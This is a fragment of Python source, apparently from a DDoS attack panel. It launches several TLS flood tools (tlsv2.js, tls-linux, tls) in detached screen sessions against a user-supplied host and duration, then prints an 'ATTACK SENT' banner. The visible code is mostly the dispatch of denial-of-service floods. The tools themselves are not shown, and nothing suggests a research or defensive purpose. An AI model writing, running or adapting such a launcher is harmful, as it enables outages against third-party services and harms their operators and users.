...
""")
			...
			try:
				...
				os.system(f'cd /media && screen -dm node tlsv2.js {host} {time} 300 1')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
...
""")
			...
			try:
				...
				os.system(f'cd wormc && screen -dm ./tls-linux {host} {time} 64 3 500')
				os.system(f'cd godzilla && screen -dm ./tls {host} {time} 8 8 500')
				os.system(f'cd /media && screen -dm ./tls {host} {time} 300 5 500')
				os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 5 500')  
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
